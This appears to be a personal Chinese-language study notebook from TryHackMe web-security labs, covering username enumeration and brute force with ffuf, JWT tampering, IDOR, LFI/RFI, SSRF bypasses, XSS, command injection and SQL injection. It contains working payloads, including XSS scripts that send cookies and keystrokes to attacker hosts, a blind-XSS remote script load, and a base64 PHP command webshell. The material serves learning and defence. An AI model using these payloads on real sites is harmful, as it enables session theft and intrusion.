

# Authentication Bypass  绕过身份验证

## 1.Username Enumeration  用户名枚举


网站错误消息是整理此信息以构建有效用户名列表的重要资源。
如果您尝试输入用户名  **管理员**  并使用虚假信息填写其他表单字段，您会看到我们收到错误 “具有**此用户名的帐户已存在** ”。我们可以使用下面的 ffuf 工具，利用此错误消息的存在生成已在系统上注册的有效用户名列表。
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.96.99/customers/signup -mr "username already exists"

```

>`-w` 参数选择文件在计算机上的位置，其中包含我们将要检查的用户名列表是否存在。`-X` 参数指定请求方法，默认情况下这将是一个 GET 请求，但在我们的示例中它是一个 POST 请求。`-d` 参数指定我们要发送的数据。在我们的示例中，我们有字段 username、email、password 和 cpassword。我们已将用户名的值设置为 **FUZZ**。在 ffuf 工具中，FUZZ 关键字表示单词列表中的内容将在请求中插入的位置。`-H` 参数用于向请求添加其他标头。在本例中，我们设置了 `Content-Type` ，以便 Web 服务器知道我们正在发送表单数据。`-u` 参数指定我们发出请求的 URL，最后，`-mr` 参数是我们要查找的页面上的文本，以验证我们是否找到了有效的用户名。

 [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)
 ↑  ffuf工具本地安装链接

找到用户名之后
```
user@tryhackme$ nano valid_usernames.txt
```
**创建一个文本把找到的用户名称录入进去
- `nano myfile.txt`
    
- 编辑文本
    
- `Ctrl + O` → 回车（保存）
    
- `Ctrl + X`（退出）

进行下一步，暴力破解↓  






## 2.Brute Force  蛮力
**注意：如果您通过直接从 ffuf 管道输出来创建 valid_usernames 文件，则可能会遇到此任务的困难。清理数据，或仅将名称复制到新文件中。**

```bash
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.96.99/customers/login -fc 200

```
**运行此命令时，请确保终端与 valid_usernames.txt 文件位于同一目录中。**

>在本例中，我们选择 `W1` 作为有效用户名列表，选择 `W2` 作为我们将尝试的密码列表。多个单词列表再次使用 `-w` 参数指定，但用逗号分隔。我们使用 `-fc` 参数来过滤200状态码。







## 3.Logic Flaw  逻辑缺陷

![Pasted image 20250913122811.png](Pasted%20image%2020250913122811.png)


例如：
下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进一步检查客户端是否实际上是管理员。如果页面不以 /admin 开头，则该页面将向客户端显示。
```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

>注意！！===  意思为找到一个字符串上的完全匹配，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 /adMin 的 未经身份验证的用户将不会检查其权限并向他们显示页面，从而完全绕 过身份验证检查。
==重点↑==

实例：当我尝试重置靶账号名为robert；账号为robert@customer.acmeitsupport.thm的密码时，发现重置密码需要一个email，一个username。


逻辑即为，用username确定我们需要更改 robert的密码，但发送到我们的hyyqyy的email中。

如图是正常更改密码返回的数据包↓
```bash
user@tryhackme$ curl 'http://10.10.35.82/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
>?我们使用 `-H` 标志向请求添加一个额外的标头。在本例中，我们将 `Content-Type` 设置为 `application/x-www-form-urlencoded` ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。

服务器会返回给我们一个重置密码的URL


我们进行一些更改

```bash
user@tryhackme$ curl 'http://10.10.35.82/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hyyqyy@customer.acmeitsupport.thm'
```
这样，我们就可以在hyyqyy的email中收到robert的更改密码邮件。







## 4.Cookie Tampering     Cookie 篡改

### 1.Plain Text  纯文本

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/

Set-Cookie: admin=false; Max-Age=3600; Path=/  

```

login为真可以登录，admin表示是否管理员身份登录

```bash
user@tryhackme$ curl http://MACHINE_IP/cookie-test



user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test



user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test

```


以上分别为    **未登录**      **以用户身份登录**    **管理员身份登录**



### 2.cookie可能会是哈希值

有md5   sha-256   sha-512  sha1


[https://crackstation.net/](https://crackstation.net/)
↑解码md5等哈希值
（1）https://www.base64encode.org/

（2）[此在线工具](https://appdevtools.com/base64-encoder-decoder)

编码base64。。decode同理

https://fusionauth.io/dev-tools/jwt-decoder


令牌在线改写↑

#### cookieJWT改写
当我们遇到一个cookie是以令牌形式呈现的时候
![Pasted image 20250920161204.png](Pasted%20image%2020250920161204.png)

他一般由这三部分组成

最后的singnature可以验证是否篡改了令牌


但是我们想要篡改令牌的时候
![[Pasted image 20250920161351.png]]


只需要将header的alg的编码方式改成none
并且删除掉签名
就可以绕过验证。
有时候编码中会有“=“    这个是填充字符，正常来说不影响内容，但是很多网站不支持填充。删去即可。


##### none禁用？
如果后端已经修复 alg=none 漏洞，还能不能绕过？ 还是想知道 如果 alg=none 被禁用，我们应该用什么方法攻击？
###### 🔐 1️⃣ 攻击思路一：弱密钥 / 暴力破解

如果 JWT 使用的是 **对称算法（HS256, HS384, HS512）**，签名是用服务器上的“密钥”计算的。

- 如果密钥太弱（例如 `secret`、`123456`），你可以用工具爆破出密钥
    
- 拿到密钥后就能生成任意合法签名，伪造管理员 token
    

工具示例：

`# 使用 jwt-tool 爆破 jwt-tool <your_token> -d -k /usr/share/wordlists/rockyou.txt`

或用 Python：

`import jwt  token = "原始JWT" for key in ["secret", "123456", "admin"]:     try:         data = jwt.decode(token, key, algorithms=["HS256"])         print(f"[+] 找到密钥: {key}")         print(data)         break     except:         pass`

---

###### 🧩 2️⃣ 攻击思路二：算法混淆攻击（HS256 → RS256）

有些后端支持多种算法，比如：

- HS256 = 对称密钥
    
- RS256 = 非对称密钥（公私钥）
    

如果后端代码直接信任 header 的 `alg`，可能被你改成 RS256，然后用公钥自己签名，导致完全绕过签名验证。

> ⚠️ 这个攻击在现在也比较少见，因为大多数库会强制检查公钥/私钥类型。

---

###### 🔑 3️⃣ 攻击思路三：过期时间 / 逻辑漏洞

- 修改 payload 的 `exp`、`nbf`、`iat` 等字段，看服务器是否严格验证过期时间
    
- 有的实现只验证签名，不管时间字段，就能让过期 token 永远有效
    

---

###### 🕵️ 4️⃣ 攻击思路四：泄露密钥

- 查找源码、配置文件、Git 历史，可能会发现 JWT 密钥
    
- 看 `/proc/self/environ`，可能环境变量里就有 `JWT_SECRET`
    
- 有时还会放在 `.env` 文件、docker-compose.yml
    

---

###### 🔨 5️⃣ 工具辅助

常用工具：

- **jwt-tool**（最常用，功能全）
    
- **jwt-cracker**
    
- **hashcat**（支持爆破 HS256 签名）
    
- **Burp Suite 插件 - JWT Editor**
    

---

###### 🧠 总结

✅ **如果 alg=none 被禁用**，常见的攻击方向是：

- 爆破签名密钥
    
- 尝试算法混淆
    
- 篡改时间字段看是否校验
    
- 在服务器文件、环境变量、源码里找密钥
    

也就是说，JWT 攻击不仅仅是 `alg=none`，而是一个更广的攻击面。




# IDOR 漏洞
>定义：当一个网站或应用直接通过 **用户提供的输入**（如 URL 参数、表单字段）来访问后台的对象（数据库记录、文件、资源），而**没有做权限检查**，就可能产生 IDOR 漏洞。



![[Pasted image 20250913162208.png]]

>当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常会首先获取原始数据并对其进行编码。网络上最常用的编码技术是 base64 编码。或者将id转换为哈希值。

通常我们这样来发现一个IDOR漏洞

- 先注册两个账号（账号 A、账号 B）。
    
- 用账号 A 登录，访问某个资源（比如订单详情、个人资料），观察请求里的 `id` 值。
    
- 把请求中的 `id` 改成账号 B 的 `id`。
    
- 如果服务器返回了账号 B 的数据，而没有拒绝访问，说明缺少访问控制 → 存在 IDOR。

#  File Inclusion  文件包含
>**文件包含漏洞**是指：  
网站根据用户输入动态加载文件时，没有对输入做严格校验，导致攻击者能让服务器去加载**意料之外的文件**，甚至执行恶意代码。



![[Pasted image 20250913163627.png]]

![[Pasted image 20250913163650.png]]

一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示他们的简历，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf   其中file是参数，userCV.pdf 是访问所需的文件。

## Path Traversal  路径遍历


>当用户的输入传递给 PHP 中的 file_get_contents 等函数时，就会出现路径遍历漏洞。
>

![[Pasted image 20250913165429.png]]

我们可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为  dot-dot-slash攻击. 如果攻击者找到入口点，在本例中为 get.php？file=，那么攻击者可能会发送如下内容， http：//webapp.thm/get。php？file=.. /.. /.. /.. /etc/passwd

假设没有输入验证，并且 Web 应用程序不是访问 /var/www/app/CV 位置的 PDF 文件，而是从其他目录（在本例中为 /etc/passwd）检索文件。每个   ..    条目移动一个目录，直到到达根目录 /     然后它将目录更改为 /etc，并从那里读取 passwd 文件。![[Pasted image 20250913165818.png]]

常见系统文件：
![[屏幕截图 2025-09-13 170144.png]]
![[屏幕截图 2025-09-13 170257.png]]

## Local File Inclusion - LFI  本地文件包含 - LFI

通常可以这样来直接访问根目录中的passwd（当include函数中没有指定目录时）
```
http://webapp.thm/get.php?file=/etc/passwd
```






当源代码写成这样，当我们搜索/etc/passwd时，会找/etc/passwd.php
```php
$file = $_GET['page'];
include("languages/" . $file . ".php");
?>
```
所以，我们使用%00（空字符）/etc/passwd%00.php这样就会忽略后面的.php

>**注意：**%00 技巧已修复，不适用于 PHP 5.3.4 及更高版本

   编码绕过


- **URL 编码**：
    - `../` -> `..%2f`
    - `/etc/passwd` -> `%2fetc%2fpasswd`
- **双重编码**：
    - `../` -> `..%252f`
- **Base64 编码**：
    - `page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`












当我们发送以下请求时
`http://webapp.thm/index.php?lang=../../../../etc/passwd`

我们收到以下错误！
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
因为web将../替换为空字符串了
所以，我们可以发送
....//....//....//....//....//etc/passwd
因为 PHP 过滤器仅匹配并替换第一个子集字符串 `../` 它找到并且不执行另一次传递，留下下图所示的内容。
![[Pasted image 20250913214646.png]]


>当get请求被过滤特殊字符../时，可以尝试使用post请求获取/etc/flag。注意get改post要加
>Content-Type头，常见用application/x-www-form-urlencoded
>
## Remote File Inclusion - RFI   远程文件包含 - RFI

>RFI 的一个要求是需要打开 allow_url_fopen 选项。



![[Pasted image 20250913223314.png]]


>防止web漏洞的方法：
1.使用最新版本更新系统和服务，包括 Web 应用程序框架。
2.关闭 PHP 错误以避免泄露应用程序的路径和其他可能泄露的信息。
3.Web 应用程序防火墙 （WAF） 是帮助缓解 Web 应用程序攻击的不错选择。
4.仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。
5.永远不要相信用户输入，并确保针对文件包含实施适当的输入验证。
6.实施文件名和位置的白名单以及黑名单。
7.如果您的 Web 应用程序不需要某些 PHP 功能，请禁用这些功能，这些功能会导致文件包含漏洞，例如 allow_url_fopen 打开和 allow_url_include。


##  测试 LFI 的步骤

>1.找到一个可以通过 GET、POST、COOKIE 或 HTTP 标头值的入口点！
2.输入有效的输入以查看 Web 服务器的行为方式。
3.输入无效的输入，包括特殊字符和常用文件名。
4.不要总是相信您在输入表单中提供的内容就是您的意图！使用浏览器地址栏或 Burpsuite 等工具。
5.在输入无效输入时查找错误以披露 Web 应用程序的当前路径;如果没有错误，那么反复试验可能是您的最佳选择。
6.了解输入验证以及是否有任何过滤器！
7.尝试注入有效条目以读取敏感文件




# SSRF（Server-Side Request Forgery，服务器端请求伪造



以下示例展示了攻击者如何完全控制由网络服务器请求的页面。
预期的请求是网站.thm服务器期望接收的内容，其中红色部分是网站将获取信息的URL。
攻击者可以将红色区域修改为他们选择的URL。



![[Pasted image 20250914101758.png]]


仍然可以使用目录遍历
![[Pasted image 20250914102011.png]]


在这个例子中，攻击者可以控制请求所指向的服务器子域名。请注意，以 &x= 结尾的有效负载被用来阻止剩余路径被附加到攻击者的URL末尾，而是将其转换为查询字符串上的参数 (?x=)。
**&x=的作用是阻止网站把后续路径拼接到攻击者的 URL 后面，  
而是把它变成查询字符串中的一个参数（即 `?x=`），这样就不会破坏攻击者精心构造的请求了。![[Pasted image 20250914102624.png]]


正常服务器`website.thm`会向自己的服务器`api.website.thm`.发送请求
但我们可以认为注入，让`website.thm`原本要发到`api.website.thm`的文件发到我们的服务器
因为 `website.thm` 是服务器端在发请求，它可能会附带一些敏感信息，例如：

- API 访问的认证头（Authorization Header）
    
- Cookies
    
- API Key

![[Pasted image 20250914102652.png]]


可以通过许多不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：

1.**当地址栏的参数中使用完整 URL 时：**![[Pasted image 20250914104236.png]]

2.**窗体中的隐藏字段：**![[Pasted image 20250914104246.png]]

3.**部分 URL，例如主机名：**![[Pasted image 20250914104255.png]]

4.**或者可能只是 URL 的路径：**![[Pasted image 20250914104305.png]]

<!--https://www.mysite.com/sms?server=attacker.thm&msg=ABC
是向服务器发送文件
https://www.mysite.com/from?server=attacker.thm&msg=ABC
是获取文件

-->



###  绕过常见的 SSRF 防御

1.**Allow List  允许列表**

允许列表是指所有请求都被拒绝的地方，除非它们出现在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 https://website.thm 开头的规则。攻击者可以通过在攻击者的域名（例如 https://website.thm.attackers-domain.thm）上创建子域来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。

2.**Deny List  拒绝列表**

拒绝列表是接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求的地方。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或进一步的敏感信息，因此 localhost 和 127.0.0.1 等域名将出现在拒绝列表中。攻击者可以使用替代本地主机引用（例如 0、0.0.0.0、0000、127.1、127.*.*.*、2130706433、017700000001）或具有解析为 IP 地址 127.0.0.1 的 DNS 记录（例如 127.0.0.1.nip.io）的子域来绕过拒绝列表。
此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域，该子域具有指向 IP 地址 169.254.169.254 的 DNS 记录，从而绕过这一点。

3.**Open Redirect  打开重定向**

如果上述绕过不起作用，攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 https://website 为例。thm/link？url=https：//tryhackme.com。创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。




#  Intro to Cross-site Scripting  （XSS）跨站点脚本简介

## XSS意图示例：


1.``php
<script>alert('XSS');</script>
``  
若有xss漏洞会显示alart（xss）



2.用户会话的详细信息（例如登录令牌）通常保存在目标计算机上的 cookie 中。下面的 JavaScript 获取目标的 cookie，base64 对 cookie 进行编码以确保成功传输，然后将其发布到黑客控制下的网站进行记录。
``php
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`


3.以下代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站。
``php
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

4.一个用于更改用户电子邮件地址的 JavaScript 函数 ，称为 `user.changeEmail（）。` 您的有效负载可能如下所示：
``php
<script>user.changeEmail('attacker@hacker.thm');</script>`




## Reflected XSS  反射型 XSS

![[Pasted image 20250914210849.png]]

如果输入错误，则会显示错误消息的网站。错误消息的内容取自查询字符串中的**错误**参数，并直接内置到页面源中。![[Pasted image 20250914210916.png]]

应用程序不会检查**错误**参数的内容，这允许攻击者插入恶意代码。![[Pasted image 20250914210925.png]]


### **如何测试能否使用反射 XSS：**

- Parameters in the URL Query String  
    URL 查询字符串中的参数
    
- URL File Path  URL 文件路径
- Sometimes HTTP Headers (although unlikely exploitable in practice)  
    有时是 HTTP 标头（尽管在实践中不太可能被利用）






## Stored XSS  存储的 XSS

XSS 有效负载存储在 Web 应用程序上（例如，在数据库中），然后在其他用户访问站点或网页时运行。


**示例场景：**

当我们注入的恶意数据存储在数据库中，并且现在访问该文章的所有其他用户都将在他们的浏览器中运行 JavaScript。

![[Pasted image 20250914211656.png]]


### **如何测试能否使用存储的 XSS：**

- Comments on a blog  博客上的评论
- User profile information  
    用户配置文件信息  
    
- Website Listings  网站列表



## DOM Based XSS  基于 DOM 的 XSS


**什么是 DOM？：**
DOM 代表 **D**ocument **O**bject **M**odel，是 HTML 和 XML 文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档可以显示在浏览器窗口中，也可以作为 HTML 源代码显示。
举个例子，假设网页是：



举个例子，假设网页是：
<html>
  <body>
    <h1>Hello</h1>
    <p>World</p>
  </body>
</html>


浏览器会生成一个 DOM 树：


```less
Document
 └─ html
    └─ body
       ├─ h1 (text: "Hello")
       └─ p (text: "World")

```

JavaScript 可以通过 DOM API 操作这个结构，例如：


```js
document.querySelector("h1").textContent = "Hi!";
```

执行后，页面上的 `<h1>` 内容会变成 “Hi!”。

### **如何测试是否可以使用基于 Dom 的 XSS：**

您需要查找访问攻击者可以控制的某些变量的代码部分，例如“**window.location.x**”参数。


找到这些代码后，您需要查看它们是如何处理的，以及这些值是否曾经写入网页的 DOM 或传递给不安全的 JavaScript 方法，例如 ==**eval（）**==

## Blind XSS  盲打型跨站脚本攻击

它和普通的 **反射型 XSS** 或 **存储型 XSS** 不同的地方在于：

- **攻击者在注入 payload 时看不到直接效果**（没有弹窗、没有立即执行）。
    
- 恶意脚本会在 **网站后台、管理员面板、或其他延迟加载的地方** 被执行。
    
- 攻击者必须等待目标系统的其他用户（比如管理员）访问这些页面，才会触发 payload。


**攻击者提交 payload**

- 比如在网站留言板、联系表单、用户名字段、订单备注里放一段恶意脚本：
- ```html
  <script src="https://attacker.com/steal.js"></script>

  ```
- **网站把数据存到数据库**
    
    - 用户看不到任何异常，页面也不会执行脚本。
        
- **管理员或客服在后台查看数据**
    
    - 当他们打开后台管理界面，页面会从数据库取出刚才的数据并显示。
        
    - 如果后台没有对输出做转义，payload 会被插入 DOM 并执行。
        
- **恶意脚本在管理员浏览器执行**
    
    - 攻击者可以窃取管理员的 session、执行管理操作（比如创建新管理员账号、修改配置），从而拿下整个系统。






因为攻击者看不到即时效果，所以必须用一些方法确认 payload 是否被触发，例如：

- **Webhook / 外部监听服务器**  
    Payload 里包含 `fetch()` 或 `new Image()`，把触发信息回传到攻击者的服务器：
    
    `<script> fetch("https://attacker.com/log?cookie=" + document.cookie); </script>`
    
    这样攻击者一旦收到请求，就知道有人（可能是管理员）触发了脚本。
    
- **延迟检测工具**  
    有安全研究人员专门写工具来测试 Blind XSS，比如 **XSS Hunter**，自动记录 payload 被触发的时间、IP、User-Agent。


[XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
blind XSS 工具。该工具会自动捕获 cookie、URL、页面内容等。





## 示例
场景是：  
网站把用户输入插入到 HTML 里，具体是 **放在 `<input>` 标签的 value 属性里**，比如
```html
<input type="text" value="这里插入用户输入">

```


如果用户输入了 `abc`，页面就会变成：
```html
<input type="text" value="abc">

```



如果我们直接输入 `<script>alert('XSS');</script>`，最终页面会是

```html
<input type="text" value="<script>alert('XSS');</script>">

```


为了让浏览器“跳出” `value` 属性，我们需要先**结束掉当前属性和标签**，再写我们的 `<script>`。  
这个 payload 正是这么做的：
```html
"><script>alert('THM');</script>

```

当它被插入到页面时，变成：```
```html
<input type="text" value=""><script>alert('THM');</script>

```










==重点是先输入看他是什么输入格式，做出对应的策略如果==![[Pasted image 20250914221417.png]]、
Adam是输入内容
那我们可以输入如
 `</textarea><script>alert('THM');</script>`
 的内容让`<textarea>`结束



再例如
 ![[Pasted image 20250914221815.png]]
Adam还是输入内容

您必须转义现有的 JavaScript 命令，以便能够运行代码;您可以使用以下有效负载 `';alert（'THM'）;//`  您将从下面的屏幕截图中看到它将执行您的代码。`'` 关闭指定名称的字段，然后 `;` 表示当前命令的结束，末尾的`//`将后面的任何内容作为注释而不是可执行代码![[Pasted image 20250914221915.png]]









如果我们想侦听端口 9001，我们发出命令 `nc -l -p 9001`。`-l` 选项表示我们要在侦听模式下使用 Netcat，而 `-p` 选项用于指定端口号。为了避免通过 DNS 解析主机名，我们可以添加 `-n`;此外，要发现任何错误，请通过添加 `-v` 选项。最终命令变为 `nc -n -l -v -p 9001`，相当于 `nc -nlvp 9001`。

```bash
user@machine$ nc -nlvp 9001 
```


再在要攻击的web上构建有效负载
```bash
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

`fetch（）` 命令发出 HTTP 请求。

`URL_OR_IP` 是 THM 请求捕获器 URL、来自 THM AttackBox 的 IP 地址或您在 THMVPN 上的 IP 地址 网络。


`PORT_NUMBER` 是用于侦听 AttackBox 上的连接的端口号。


`？cookie=` 是包含受害者 cookie 的查询字符串。


`btoa（）` 命令 base64 对受害者的 cookie 进行编码。


`document.cookie` 访问受害者的 Acme IT 支持网站 cookie。













#  Race Condition 竞态条件
一个银行账户有 75 美元。两个线程尝试同时取款。线程 1 检查余额（查看 75 美元）并提取 50 美元。**在线程 1 更新余额之前** ，线程 2 检查余额（错误地看到 75 美元）并提取 50 美元。线程 2 将继续提款，尽管此类交易应该被拒绝。
检查时间到使用时间 （TOCTOU） 漏洞这就是竞争条件





## 在网络安全中的应用

攻击者会利用 Race Condition 漏洞去：

- **绕过访问控制**：多次快速发请求，可能抢先执行敏感操作
    
- **多次领取奖励**：比如重复领取优惠券、积分
    
- **双花漏洞**：在支付系统里支付一次，获得两次订单
    
- **权限提升**：抢在权限检查更新前执行敏感操作





##  Causes  原因


正如我们在上一个程序中看到的，两个线程正在更改同一个变量。每当线程获得 CPU 时间时，它就会急于将 `x` 增加 1。因此，这两个线程正在“竞速”递增相同的变量。








#  Command Injection  命令注入

命令注入主要可以通过以下两种方式之一进行检测：

1. Blind command injection  
    盲指令注入
2. Verbose command injection  
    详细命令注入



|                |                                                                                                                                                                                                                                                                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Method  方法** | **Description  描述**                                                                                                                                                                                                                                                                                                                                                      |
| Blind  盲       | This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.  <br>这种类型的注入是在测试有效负载时没有应用程序直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。                                                                             |
| Verbose  详细    | This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly.  <br>这种类型的注入是在测试有效负载后从应用程序获得直接反馈的地方。例如，运行 `whoami` 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。 |


## 检测盲命令注入

对于这种类型的命令注入 ，我们需要使用会导致一些时间延迟的有效负载。例如，`ping` 和 `sleep` 命令是需要测试的重要有效负载。以 `ping` 为例，应用程序将根据您指定的 _ping_ 数挂起 _x_ 秒。

检测盲命令注入的另一种方法是强制一些输出。这可以通过使用重定向运算符（例如 `>`）来完成 。如果您不熟悉这一点，我建议您查看 [Linux 基础模块](https://tryhackme.com/module/linux-fundamentals) 。例如，我们可以告诉 Web 应用程序执行诸如 whoami 之类的命令 并将其重定向到文件。然后，我们可以使用诸如 cat 之类的命令 来读取这个新创建的文件的内容。

`curl` 命令是测试命令注入的好方法。这是因为您可以使用 `curl` 向有效负载中的应用程序传送数据。以下面的代码片段为例，可以将简单的 curl 有效负载添加到应用程序中进行命令注入 。

## 检测详细命令注入


例如，`ping` 或 `whoami` 等命令的输出 直接显示在 Web 应用程序上。



Linux 的

|   |   |
|---|---|
|**Payload  有效载荷**|**Description  描述**|
|whoami  呜|See what user the application is running under.  <br>查看应用程序在哪个用户下运行。|
|ls|List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.  <br>列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）以及更多有价值的内容等文件。|
|ping  乒|This command will invoke the application to hang. This will be useful in testing an application for blind command injection.  <br>此命令将调用要挂起的应用程序。这对于测试应用程序的盲命令注入非常有用。|
|sleep  睡|This is another useful payload in testing an application for blind command injection, where the machine does not have `ping` installed.  <br>这是测试应用程序的另一个有用的有效负载，用于测试盲命令注入 ，其中机器没有安装 `ping`。|
|nc  数控|Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.  <br>Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机中导航以获取其他服务、文件或潜在的权限提升方式。|


Windows



|                   |                                                                                                                                                                                                                                                 |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Payload  有效载荷** | **Description  描述**                                                                                                                                                                                                                             |
| whoami  呜         | See what user the application is running under.  <br>查看应用程序在哪个用户下运行。                                                                                                                                                                            |
| dir  你            | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.  <br>列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）以及更多有价值的内容等文件。 |
| ping  乒           | This command will invoke the application to hang. This will be useful in testing an application for blind command injection.  <br>此命令将调用要挂起的应用程序。这对于测试应用程序的盲命令注入非常有用。                                                                           |
| timeout  超时       | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.  <br>此命令还将调用要挂起的应用程序。如果未安装 `ping` 命令，它对于测试应用程序的盲命令注入也很有用。               |

## Remediating Command Injection  修复命令注入


以下面的这个片段为例。在这里，应用程序将仅接受和处理输入到表单中的数字。这意味着不会处理任何命令，例如 `whoami`。


![[Pasted image 20250915195355.png]]

1. The application will only accept a specific pattern of characters (the digits  0-9)  
    应用程序将仅接受特定的字符模式（数字 0-9）
2. The application will then only proceed to execute this data which is all numerical.  
    然后，应用程序将只继续执行这些数据，这些数据都是数字的。




**Input sanitisation  输入清理**
清理应用程序使用的用户的任何输入是防止命令注入的好方法。这是指定用户可以提交的数据格式或类型的过程。例如，仅接受数字数据或删除任何特殊字符（例如 `>` 、  `&` 和 `/`）的输入字段。
在下面的代码片段中，`filter_input`[PHP 函数](https://www.php.net/manual/en/function.filter-input.php)用于检查通过输入表单提交的任何数据是否为数字。如果不是数字，则必须是无效输入。
![[Pasted image 20250915195418.png]]



Bypassing Filters  绕过过滤器
假设一个网站有 SQL 注入漏洞，但会把所有 `'` 单引号删除。

你输入：

```sql
' OR 1=1--

```
被过滤成：

```sql
 OR 1=1--

```

可能导致语法错误。

你可以改成十六进制编码：

```sql
0x4F5220313D31--

```

# SQL注入

SQL (Structured Query Language)（结构化查询语言）用于查询数据库。这些 SQL 查询最好称为语句。
==SQL 语法不区分大小写。==



## SQL数据库的结构
## **1️⃣ SQL 数据库的层级结构**

可以把 SQL 数据库想成一栋大楼，每层有不同的用途：

数据库 (Database)        ← 整栋楼   
         └─ 表 (Table)         ← 楼里的房间        
                 └─ 列/字段 (Column) ← 房间里的抽屉              
                           └─ 数据 (Data) ← 抽屉里的具体物品

### 具体解释：

|层级|名称|对应概念|例子|
|---|---|---|---|
|数据库|database|一整个项目或者系统的数据仓库|`shop_db`|
|表|table|数据库里的一个分类集合，相当于房间|`users`、`orders`|
|列/字段|column|表里的属性，相当于抽屉|`id`, `name`, `email`, `password`|
|数据|row / record|表里的一条完整记录，相当于抽屉里的具体物品|`(1, 'Alice', '123@qq.com', 'pwd123')`|

---

## **2️⃣ information_schema 的作用**

`information_schema` 是 MySQL 内置的 **系统数据库**，它记录了数据库里“楼里的房间和抽屉的清单”。

主要常用的表：

|表名|用途|
|---|---|
|`schemata`|存储数据库列表（哪几栋楼）|
|`tables`|存储表信息（楼里有哪些房间）|
|`columns`|存储字段信息（房间里有哪些抽屉）|
|`statistics` / `key_column_usage`|存储索引、主键等信息|

---

## **3️⃣ 从 `information_schema` 找到你想要的某一列数据**

假设你的目标是：**在 `shop_db` 里找到 `users` 表的 `email` 列里的所有内容**。

### Step 1：找数据库

`SELECT schema_name  FROM information_schema.schemata;`

结果可能是：

`+-------------+ | schema_name | +-------------+ | shop_db     | | test_db     | | mysql       | +-------------+`

✅ 你确认目标数据库是 `shop_db`。

---

### Step 2：找表

`SELECT table_name  FROM information_schema.tables WHERE table_schema='shop_db';`

结果：

`+------------+ | table_name | +------------+ | users      | | orders     | | products   | +------------+`

✅ 你确认目标表是 `users`。

---

### Step 3：找列

`SELECT column_name  FROM information_schema.columns WHERE table_schema='shop_db'   AND table_name='users';`

结果：

`+------------+ | column_name| +------------+ | id         | | name       | | email      | | password   | +------------+`

✅ 你确认目标列是 `email`。

---

### Step 4：取具体数据

`SELECT email  FROM shop_db.users;`

结果可能是：

